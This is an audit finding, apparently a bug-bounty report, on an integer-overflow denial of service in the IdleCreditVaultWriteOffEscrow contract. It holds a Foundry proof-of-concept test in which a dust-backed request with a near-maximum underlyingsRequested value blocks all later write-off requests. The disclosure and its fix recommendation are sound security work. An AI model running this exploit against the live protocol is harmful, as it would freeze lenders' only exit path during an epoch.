### Title
Overflowing `pendingUnderlyings` via unvalidated `underlyingsRequested` permanently blocks all new write-off requests - (File: contracts/IdleCreditVaultWriteOffEscrow.sol)

### Summary
`createWriteOffRequest` accepts an arbitrary `underlyingsRequested` value and adds it to the global `pendingUnderlyings` accumulator without any sanity bound. An attacker can push `pendingUnderlyings` close to `type(uint256).max` with a single request backed by a dust amount of tranche tokens, after which every subsequent call to `createWriteOffRequest` reverts on an arithmetic overflow, denying the write-off escrow to all other users for as long as the attacker's request exists.

### Finding Description
In `IdleCreditVaultWriteOffEscrow.createWriteOffRequest` (contracts/IdleCreditVaultWriteOffEscrow.sol:86-102), any tranche-token holder can deposit `amount` tranche tokens and register a `WriteOffRequest` with an unrestricted `underlyingsRequested`. The function does `pendingUnderlyings += underlyingsRequested` with no upper-bound check on `underlyingsRequested` and no relation enforced between the tranches deposited and the underlyings requested.

An attacker calls `createWriteOffRequest(1, type(uint256).max - 1)` while the epoch is running (only gate is `isEpochRunning()`). `pendingUnderlyings` becomes `type(uint256).max - 1`. Every subsequent honest call to `createWriteOffRequest` performs `pendingUnderlyings += underlyingsRequested` with `underlyingsRequested > 0`, which overflows and reverts — permanently bricking request creation for the remainder of the running epoch.

Neither `deleteWriteOffRequest` nor `fullfillWriteOffRequest` can recover the counter: both subtract `min(pendingUnderlyings, request.underlyings)` per request, so honest users' deletions still leave the attacker's contribution saturating the counter. Only the attacker can restore functionality by deleting their own request — and they have no incentive to, since their cost was 1 wei of tranche tokens they can reclaim at any time.

### Impact Explanation
Temporary freezing of a core protocol function: the write-off escrow is the only mechanism for lenders to exit defaulted-adjacent credit by selling tranche tokens to the borrower/fulfillers during a running epoch. For the remainder of the running epoch no lender can open a write-off request — i.e., no tranche holder can initiate the only available secondary exit path. This mirrors the VTAdmin bug class (a single unvalidated input poisons shared state so a permissioned-looking flow errors for everyone), translated to the escrow's `pendingUnderlyings` accumulator. Cost to the attacker is one wei of tranche tokens plus gas; no privileged role required.

### Likelihood Explanation
Requires only: (a) an epoch in the running phase, and (b) the attacker holding any nonzero tranche-token balance (or KYC-passing lender status to acquire dust). One transaction with `underlyingsRequested = type(uint256).max - 1` suffices. There is no existing guard — no max bound on `underlyingsRequested`, no per-request cap, and no way for honest actors to force `pendingUnderlyings` back down.

### Recommendation
Cap `underlyingsRequested` at a sane bound — e.g., require it to be `<=` the tranche deposit's fair value (`amount` scaled by current virtual price / token decimals) or a configurable `MAX_UNDERLYINGS_REQUEST` — or simply revert if `pendingUnderlyings + underlyingsRequested` would exceed a ceiling such as the vault's total value. Alternatively, compute `pendingUnderlyings` updates with an explicit overflow-safe addition and a reasonable maximum, or drop the global accumulator and derive pending amounts per request only.

### Proof of Concept
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {IdleCDOEpochVariant} from "../../contracts/IdleCDOEpochVariant.sol";
import {IdleCreditVaultWriteOffEscrow} from "../../contracts/IdleCreditVaultWriteOffEscrow.sol";
import {IERC20Detailed} from "../../contracts/interfaces/IERC20Detailed.sol";

contract PendingUnderlyingsOverflowDoS is Test {
    IdleCDOEpochVariant cdoEpoch =
        IdleCDOEpochVariant(0xf6223C567F21E33e859ED7A045773526E9E3c2D5);
    IdleCreditVaultWriteOffEscrow escrow;
    IERC20Detailed tranche;

    address constant TL_MULTISIG = 0xFb3bD022D5DAcF95eE28a6B07825D4Ff9C5b3814;
    address attacker = makeAddr("attacker");
    address victim   = makeAddr("victim");

    function setUp() public {
        vm.createSelectFork('mainnet', 23032567);

        IdleCDOEpochVariant dummy = new IdleCDOEpochVariant();
        vm.etch(address(cdoEpoch), address(dummy).code);

        escrow = new IdleCreditVaultWriteOffEscrow();
        vm.store(address(escrow), bytes32(uint256(0)), bytes32(uint256(0)));
        escrow.initialize(address(cdoEpoch), TL_MULTISIG, true);

        tranche = IERC20Detailed(cdoEpoch.AATranche());
        require(cdoEpoch.isEpochRunning(), "epoch must be running");

        // give attacker and victim tranche tokens
        deal(address(tranche), attacker, 1e18);
        deal(address(tranche), victim, 1000e18);
        vm.prank(attacker);
        tranche.approve(address(escrow), type(uint256).max);
        vm.prank(victim);
        tranche.approve(address(escrow), type(uint256).max);
    }

    function testOverflowBlocksAllSubsequentRequests() public {
        // attacker poisons the global accumulator with dust tranches
        vm.prank(attacker);
        escrow.createWriteOffRequest(1, type(uint256).max - 1);
        assertEq(escrow.pendingUnderlyings(), type(uint256).max - 1);

        // any honest user trying to open a write-off request now reverts
        vm.prank(victim);
        vm.expectRevert(stdError.arithmeticError);
        escrow.createWriteOffRequest(1000e18, 1000e6);

        // victim's own delete/fulfill cannot repair the counter
        // (their request was never created; attacker's contribution remains)
        vm.prank(victim);
        vm.expectRevert(); // Is0()
        escrow.deleteWriteOffRequest();

        // only attacker can free the function — they retain full control of the DoS
        vm.prank(attacker);
        escrow.deleteWriteOffRequest();
        assertEq(escrow.pendingUnderlyings(), 0);
    }
}
```
